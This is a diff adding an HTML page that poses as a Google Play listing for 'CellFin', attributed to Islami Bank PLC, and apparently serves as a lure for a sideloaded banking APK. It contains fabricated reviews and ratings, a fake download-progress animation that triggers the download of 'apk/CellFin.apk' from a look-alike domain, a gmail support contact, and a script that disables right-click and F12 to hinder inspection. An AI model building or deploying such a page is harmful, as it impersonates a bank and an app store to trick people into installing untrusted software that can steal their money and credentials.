@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en"><head><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CellFin - Apps on Google Play</title>
+    <link rel="shortcut icon" href="uploads/images/favicon.png" type="image/x-icon">
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/front_end_css/style.css">
+</head>
+<body>
+<!-- Top Bar -->
+<div class="top-bar">
+    <a href="https://internationalcellfinapp.net"><img src="upload/logos/1757953729.png" alt="Google Play" class="top-bar-logo"></a>
+    <div class="top-bar-nav">
+        <a href="#">Games</a>
+        <a href="#" class="active">Apps</a>
+        <a href="#">Movies &amp; TV</a>
+        <a href="#">Books</a>
+        <a href="#">Kids</a>
+    </div>
+    <div class="top-bar-icons">
+        <i class="material-icons-outlined">search</i>
+        <i class="material-icons-outlined">help_outline</i>
+        <i class="material-icons-outlined">account_circle</i>
+    </div>
+</div>
+
+<!-- Bottom Navigation Bar (Mobile Only) -->
+<div class="bottom-nav">
+    <div class="bottom-nav-items">
+        <a href="#" class="bottom-nav-item">
+            <i class="material-icons-outlined">games</i>
+            <span>Games</span>
+        </a>
+        <a href="#" class="bottom-nav-item active">
+            <i class="material-icons-outlined">apps</i>
+            <span>Apps</span>
+        </a>
+        <a href="#" class="bottom-nav-item">
+            <i class="material-icons-outlined">child_care</i>
+            <span>Kids</span>
+        </a>
+    </div>
+</div>
+
+<!-- Confirmation Modal for Install -->
+<div class="modal" id="installModal">
+    <div class="modal-content">
+        <h3>Install CellFin</h3>
+        <p>Do you want to download and install the CellFin app? This will download a file, and you may need to Install
+            from your device File Manager.</p>
+        <div class="modal-buttons">
+            <button class="modal-button cancel" id="cancelButton">Cancel</button>
+            <button class="modal-button confirm" id="confirmButton">Install</button>
+        </div>
+    </div>
+</div>
+
+<!-- Confirmation Modal for Opening APK -->
+<div class="modal" id="redownloadModal">
+    <div class="modal-content">
+        <h3>Open CellFin App</h3>
+        <p>Do you want to open CellFin App from your device's file manager?</p>
+        <div class="modal-buttons">
+            <button class="modal-button cancel" id="redownloadCancelButton">Cancel</button>
+            <button class="modal-button confirm" id="redownloadConfirmButton">Open</button>
+        </div>
+    </div>
+</div>
+
+<!-- Custom Modal for APK Open Failure -->
+<div class="modal" id="openFailureModal">
+    <div class="modal-content">
+        <h3>Unable to Open APK</h3>
+        <p>Please open the CellFin file from your device's File Manager to install. </p>
+        <div class="modal-buttons">
+            <button class="modal-button confirm" id="openFailureOkButton">OK</button>
+        </div>
+    </div>
+</div>
+
+<div class="container">
+    <!-- App Header (Full Width) -->
+    <div class="app-header">
+        <div class="app-icon-card">
+            <img src="uploads/images/CellFinIcon.jpeg" alt="CellFin" class="app-icon">
+        </div>
+        <div class="app-info">
+            <h1 class="app-title">CellFin</h1>
+            <p class="app-developer"> Islami Bank PLC </p>
+        </div>
+    </div>
+    <div class="app-meta">
+        <div class="item">
+            <span class="star">4.8★</span>
+            <span class="desc">1458 reviews</span>
+        </div>
+        <div class="separator"></div>
+        <div class="item">
+            <span>13k+</span>
+            <span class="desc">Downloads</span>
+        </div>
+        <div class="separator"></div>
+        <div class="item">
+            <img src="assets/images/rate.png" alt="Rated for 3+">
+            <span class="desc">Rated for 3+</span>
+        </div>
+    </div>
+    <div class="app-actions">
+        <button class="install-button" id="installButton">Install</button>
+        <button class="share-button">
+            <i class="material-icons-outlined">share</i>
+            <span>Share</span>
+        </button>
+    </div>
+    <div class="device-availability">
+        <i class="material-icons-outlined">devices</i>
+        <span>This app is available for all of your devices</span>
+    </div>
+
+    <!-- Centered Content Layout -->
+    <div class="row">
+        <div class="col-12 left-section">
+            <!-- Screenshots Carousel -->
+            <div class="slider">
+                                    <div class="card">
+                        <img src="uploads/images/cellfincard (2).jpeg" alt="Card 1">
+                    </div>
+                                    <div class="card">
+                        <img src="uploads/images/cellfincard (3).jpeg" alt="Card 2">
+                    </div>
+                                    <div class="card">
+                        <img src="uploads/images/cellfincard (4).jpeg" alt="Card 3">
+                    </div>
+                                    <div class="card">
+                        <img src="uploads/images/cellfincard (1).jpeg" alt="Card 4">
+                    </div>
+                    
+                
+            </div>
+
+            <!-- What's New -->
+            <div class="whats-new section">
+                <h2 class="section-title">What’s new <i class="material-icons-outlined">arrow_forward</i></h2>
+                <p class="whats-new-content">
+                    We’re always working to improve your experience and make the app more rewarding. In this update, we’ve improved performance, fixed bugs, and made the interface easier to use.
+                </p>
+            </div>
+
+            <!-- About this app -->
+            <div class="about section">
+                <h2 class="section-title">About this app <i class="material-icons-outlined">arrow_forward</i></h2>
+                <p class="description">
+                    </p><p><strong>CellFin is the Digital Financial Service of Bangladesh.</strong><br>
+<br>
+The <strong>CellFin</strong> app is a fast, secure, and reliable digital financial service app that makes your everyday transactions simple—such as Send Money, Cash Out,(P2P)Send ,Add Money, Mobile Recharge, Live chat,Bank transfer, Scratch Card, Tally khata, Internet Offer, Minute offer and Bundel offer. You’ll receive notifications of your latest activities, and you can easily view your transaction history and summaries.<br>
+<br>
+<strong>CellFin</strong> will soon bring exciting and innovative services to meet customer needs and expectations.<br>
+<br>
+<strong>key Features:</strong><br>
+<br>
+<strong>Secure Transactions:&nbsp;</strong>The <strong>CellFin</strong> app is highly secure and requires your PIN at two different stages for extra safety<br>
+<br>
+<strong>Personalization:&nbsp;</strong>Add your display name and change your profile picture anytime<br>
+<br>
+<strong>Error-Free Money Transfer:&nbsp;</strong>Select recipients directly from your contact list to avoid sending money to the wrong number</p>
+
+<ul>
+	<li>Cash In&nbsp;</li>
+	<li>Cash Out</li>
+	<li>Send Money (P2P)</li>
+	<li>Mobile Recharge</li>
+	<li>Bill Pay</li>
+	<li>Add Money</li>
+	<li>Bank Transfer</li>
+	<li>Transaction History</li>
+	<li>Drive Offer</li>
+	<li>Loan</li>
+	<li>Live Chat</li>
+	<li>Tally Khata</li>
+	<li>Scratch Card</li>
+</ul>
+                <p></p>
+            </div>
+
+            <!-- Data Safety -->
+            <div>
+                <h2 class="section-title">Data safety<i class="material-icons-outlined">arrow_forward</i></h2>
+                <p class="description">
+                    Your data security starts with how the developer collects and shares your information. Privacy and
+                    safety measures may vary depending on how you use the app, your location, and your age. The
+                    developer provides this information and may update it over time.
+                </p>
+                <div class="data-safety section">
+                    <div class="data-item">
+                        <i class="material-icons-outlined data-icon">share</i>
+                        <span class="data-text">No data shared with third parties</span>
+                    </div>
+                    <div class="data-item">
+                        <i class="material-icons-outlined data-icon">person</i>
+                        <span class="data-text">This app may collect these data types</span>
+                    </div>
+                    <div class="data-item">
+                        <i class="material-icons-outlined data-icon">security</i>
+                        <span class="data-text">Data is encrypted in transit</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Ratings and Reviews -->
+            <div class="ratings-reviews section">
+                <h2 class="section-title">Ratings and reviews <i class="material-icons-outlined">arrow_forward</i></h2>
+                <br>
+                <div class="ratings-buttons">
+                    <button class="rate-button active"><i class="material-icons-outlined">smartphone</i> Mobile</button>
+                    <button class="rate-button"><i class="material-icons-outlined">laptop_chromebook</i> Desktop
+                    </button>
+                    <button class="rate-button"><i class="material-icons-outlined">tablet_mac</i> Tablet</button>
+                </div>
+                <div class="ratings-summary">
+                    <div class="ratings-overview">
+                        <div class="overall-rating">4.8</div>
+                        <div class="rating-stars">★★★★☆</div>
+                        <div class="total-reviews">1458 reviews</div>
+                    </div>
+                    <div class="ratings-breakdown">
+                        <div class="rating-item">
+                            <span class="rating-label">5</span>
+                            <div class="rating-bar">
+                                <div class="rating-fill" style="width: 75%;"></div>
+                            </div>
+                        </div>
+                        <div class="rating-item">
+                            <span class="rating-label">4</span>
+                            <div class="rating-bar">
+                                <div class="rating-fill" style="width: 15%;"></div>
+                            </div>
+                        </div>
+                        <div class="rating-item">
+                            <span class="rating-label">3</span>
+                            <div class="rating-bar">
+                                <div class="rating-fill" style="width: 8%;"></div>
+                            </div>
+                        </div>
+                        <div class="rating-item">
+                            <span class="rating-label">2</span>
+                            <div class="rating-bar">
+                                <div class="rating-fill" style="width: 5%;"></div>
+                            </div>
+                        </div>
+                        <div class="rating-item">
+                            <span class="rating-label">1</span>
+                            <div class="rating-bar">
+                                <div class="rating-fill" style="width: 7%;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1757960914.jpeg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Abdullah Al Mamun</span>
+                        </div>
+                        <div class="review-stars">★★★★★
+                            <span class="review-date">26 May 2025</span>
+                        </div>
+                        <p class="review-text">
+                            আমি অ্যাপটি ব্যবহার করে দারুণ অভিজ্ঞতা পেয়েছি! ক্যাশ ইন, ক্যাশ আউট এবং মোবাইল রিচার্জ করা খুব সহজ। UI ডিজাইন খুব সুন্দর। আমি এটি আমার সমস্ত আর্থিক লেনদেনের জন্য ব্যবহার করি।
+                        </p>
+                        <div class="review-helpful">27 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1757961321.webp" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Mahmudul Islam</span>
+                        </div>
+                        <div class="review-stars">★★☆☆☆
+                            <span class="review-date">11 May 2025</span>
+                        </div>
+                        <p class="review-text">
+                            অ্যাপটি ব্যবহার করা সহজ এবং মোবাইল রিচার্জ বা বিল পেমেন্টের জন্য বেশ সুবিধাজনক। 
+                        </p>
+                        <div class="review-helpful">29 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>14 May 2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761791328.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">MD.Imran</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">27/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            Best app ecare bd
+                        </p>
+                        <div class="review-helpful">5 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761791161.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Rakib</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">28/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            অ্যাপটি ব্যবহার করা সহজ এবং মোবাইল রিচার্জ বা বিল পেমেন্টের জন্য বেশ সুবিধাজনক।
+                        </p>
+                        <div class="review-helpful">5 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761791207.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Naim khan</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">28/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            100%
+                        </p>
+                        <div class="review-helpful">7 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761791450.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Moin Khan</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">27/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            CellFin is the best app
+                        </p>
+                        <div class="review-helpful">15 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>29/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761791501.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Monna bai</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">28/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            100%%%%%%
+                        </p>
+                        <div class="review-helpful">15 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761790700.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Sajidul</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">28/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            Very Helpful apps
+                        </p>
+                        <div class="review-helpful">5 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761395462.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">SaifulIslam</span>
+                        </div>
+                        <div class="review-stars">★★☆☆☆
+                            <span class="review-date">12 May 2025</span>
+                        </div>
+                        <p class="review-text">
+                            100% Trusted
+                        </p>
+                        <div class="review-helpful">29 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>14 May 2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1757960914.jpeg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Manik</span>
+                        </div>
+                        <div class="review-stars">★★★★★
+                            <span class="review-date">26 May 2025</span>
+                        </div>
+                        <p class="review-text">
+                            Trusted
+                        </p>
+                        <div class="review-helpful">27 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761791265.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Rocky</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">27/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            Excellent
+                        </p>
+                        <div class="review-helpful">6 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761790822.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Bashir Uddin</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">28/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            100% Trusted company for ecare bd
+                        </p>
+                        <div class="review-helpful">10 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761790905.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Komul Hasan</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">28/10/2025</span>
+                        </div>
+                        <p class="review-text">
+                            trusted app
+                        </p>
+                        <div class="review-helpful">15 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/10/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                
+                    <div class="review">
+                        <div class="review-header">
+                            <img src="upload/reviews/1761395462.jpg" alt="User Avatar" class="review-avatar">
+                            <span class="review-user">Kobir Hossen</span>
+                        </div>
+                        <div class="review-stars">*****
+                            <span class="review-date">24/05/2025 (Friday)</span>
+                        </div>
+                        <p class="review-text">
+                            আলহামদুলিল্লাহ
+                        </p>
+                        <div class="review-helpful">10 people found this review helpful</div>
+                        <div class="review-helpful">Did you find this helpful?
+                            <button class="rate-confirm">Yes</button>
+                            <button class="rate-confirm">No</button>
+                        </div>
+                                                    <div class="review-response">
+                                <div class="review-response-header">
+                                    <span>CellFin</span>
+                                    <span>28/05/2025</span>
+                                </div>
+                                <p class="review-response-text">Thanks</p>
+                            </div>
+                                                <span class="review-menu">⋮</span>
+                    </div>
+                            </div>
+
+            <!-- Additional Info (Expandable) -->
+            <div class="additional-info section">
+                <input type="checkbox" id="additional-info-toggle">
+                <label for="additional-info-toggle" class="section-title">
+                    App Supports
+                    <i class="material-icons-outlined expand-icon"></i>
+                </label>
+                <div class="info-content">
+                    <div class="info-item">
+                        <i class="material-icons-outlined info-icon">public</i>
+                        <div class="info-text">
+                            <span class="info-title">Website</span>
+                            <a href="https://internationalcellfinapp.net/" class="info-subtitle">https://internationalcellfinapp.net/</a>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <i class="material-icons-outlined info-icon">phone</i>
+                        <div class="info-text">
+                            <span class="info-title">Phone Number</span>
+                            <span class="info-subtitle">Contact our support team at +8801812706428</span>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <i class="material-icons-outlined info-icon">email</i>
+                        <div class="info-text">
+                            <span class="info-title">Support Email</span>
+                            <a href="mailto:softwaredeveloper1270@gmail.com" class="info-subtitle">softwaredeveloper1270@gmail.com</a>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <i class="material-icons-outlined info-icon">policy</i>
+                        <div class="info-text">
+                            <span class="info-title">Privacy Policy</span>
+                            <a href="https://www.termsfeed.com/live/c7e93147-88a1-4471-80c9-1f05c2470e0a" class="info-subtitle">https://www.termsfeed.com/live/c7e93147-88a1-4471-80c9-1f05c2470e0a</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-column">
+            <h3>Google Play</h3>
+            <ul>
+                <li><a href="#">Play Pass</a></li>
+                <li><a href="#">Play Points</a></li>
+                <li><a href="#">Gift cards</a></li>
+            </ul>
+        </div>
+        <div class="footer-column">
+            <h3>Kids &amp; family</h3>
+            <ul>
+                <li><a href="#">Parent Guide</a></li>
+                <li><a href="#">Family sharing</a></li>
+            </ul>
+        </div>
+    </div>
+</footer>
+<script>
+    const installButton = document.getElementById('installButton');
+    const installModal = document.getElementById('installModal');
+    const confirmButton = document.getElementById('confirmButton');
+    const cancelButton = document.getElementById('cancelButton');
+    const redownloadModal = document.getElementById('redownloadModal');
+    const redownloadConfirmButton = document.getElementById('redownloadConfirmButton');
+    const redownloadCancelButton = document.getElementById('redownloadCancelButton');
+    const openFailureModal = document.getElementById('openFailureModal');
+    const openFailureOkButton = document.getElementById('openFailureOkButton');
+
+    // Function to trigger APK download
+    function downloadApk() {
+        const apkPath = 'apk/CellFin.apk'; // Consistent file name
+        const link = document.createElement('a');
+        link.href = apkPath;
+        link.download = 'apk/CellFin.apk';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+
+    // Function to attempt opening APK from file manager
+    function openApk() {
+        const apkPath = 'apk/CellFin.apk'; // Consistent file name
+        try {
+            window.location.href = apkPath; // Attempt to open the APK
+        } catch (error) {
+            console.error('Error opening APK file:', error);
+            openFailureModal.style.display = 'flex'; // Show custom failure modal
+        }
+    }
+
+    // Show modal when Install button is clicked
+    installButton.addEventListener('click', () => {
+        if (installButton.textContent === 'Open') {
+            redownloadModal.style.display = 'flex'; // Show confirmation for opening
+        } else {
+            installModal.style.display = 'flex'; // Show confirmation for initial install
+        }
+    });
+
+    // Handle confirm button click for initial install
+    // Handle confirm button click for initial install
+    confirmButton.addEventListener('click', () => {
+        // Hide modal
+        installModal.style.display = 'none';
+
+        // Disable button during download
+        installButton.disabled = true;
+
+        // Simulate download progress
+        const progressSteps = [5, 10, 30, 50, 80, 100];
+        let currentStep = 0;
+
+        const updateProgress = () => {
+            if (currentStep < progressSteps.length) {
+                installButton.textContent = `${progressSteps[currentStep]}% Download ....`;
+                currentStep++;
+                setTimeout(updateProgress, 1500); // Update every 1.5 seconds
+            } else {
+                // Download complete
+                installButton.textContent = 'Installing...';
+                installButton.disabled = false;
+
+                // Simulate installing for 15 seconds
+                setTimeout(() => {
+                    installButton.textContent = 'Open';
+                    installButton.disabled = false;
+                }, 25000); // 15 seconds
+
+                downloadApk(); // Trigger single download
+            }
+        };
+
+        updateProgress();
+    });
+
+
+    // Handle confirm button click for opening APK
+    redownloadConfirmButton.addEventListener('click', () => {
+        // Hide redownload modal
+        redownloadModal.style.display = 'none';
+        openApk(); // Attempt to open the APK
+    });
+
+    // Handle cancel button click for install modal
+    cancelButton.addEventListener('click', () => {
+        installModal.style.display = 'none';
+    });
+
+    // Handle cancel button click for redownload modal
+    redownloadCancelButton.addEventListener('click', () => {
+        redownloadModal.style.display = 'none';
+    });
+
+    // Handle OK button click for open failure modal
+    openFailureOkButton.addEventListener('click', () => {
+        openFailureModal.style.display = 'none';
+    });
+
+    // Close modals if clicking outside the modal content
+    installModal.addEventListener('click', (e) => {
+        if (e.target === installModal) {
+            installModal.style.display = 'none';
+        }
+    });
+
+    redownloadModal.addEventListener('click', (e) => {
+        if (e.target === redownloadModal) {
+            redownloadModal.style.display = 'none';
+        }
+    });
+
+    openFailureModal.addEventListener('click', (e) => {
+        if (e.target === openFailureModal) {
+            openFailureModal.style.display = 'none';
+        }
+    });
+</script>
+
+<script>
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function (event) {
+        event = event || window.event;
+
+        // Disable F12 (Inspect element)
+        if (event.keyCode === 123) {
+            return false;
+        }
+
+        // Allow Ctrl+C (67), Ctrl+X (88), Ctrl+V (86), Ctrl+Z (90), Ctrl+R (82), and F5 (116)
+        // Check if Ctrl is held down and keycode is not in the allowed list
+        if (event.ctrlKey && ![67, 82, 86, 88, 90].includes(event.keyCode)) {
+            return false; // Block other Ctrl combinations
+        }
+
+        // Allow F5 (Refresh)
+        if (event.keyCode === 116) {
+            return true;
+        }
+    };
+
+    // Prevent right-click using the mouse (right-click button)
+    document.onmousedown = function (event) {
+        if (event.button === 2) { // Right-click is button 2
+            return false;
+        }
+    };
+
+    // Fix for Ctrl+V not working in input elements
+    document.onkeydown = function (event) {
+        event = event || window.event;
+
+        // Disable F12 (Inspect element)
+        if (event.keyCode === 123) {
+            return false;
+        }
+
+        // Allow Ctrl+C (67), Ctrl+X (88), Ctrl+V (86), Ctrl+Z (90), Ctrl+R (82), and F5 (116)
+        // Allow Ctrl+V specifically in input and textarea
+        if (event.ctrlKey && event.keyCode === 86 && (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA")) {
+            return true;  // Allow Ctrl+V in input or textarea
+        }
+
+        // Block other Ctrl key combinations
+        if (event.ctrlKey && ![67, 82, 86, 88, 90].includes(event.keyCode)) {
+            return false; // Block other Ctrl combinations
+        }
+
+        // Allow F5 (Refresh)
+        if (event.keyCode === 116) {
+            return true;
+        }
+    };
+
+    // Prevent right-click using the mouse (right-click button)
+    document.onmousedown = function (event) {
+        if (event.button === 2) { // Right-click is button 2
+            return false;
+        }
+    };
+
+</script>
+
+</body>
+
+</html>
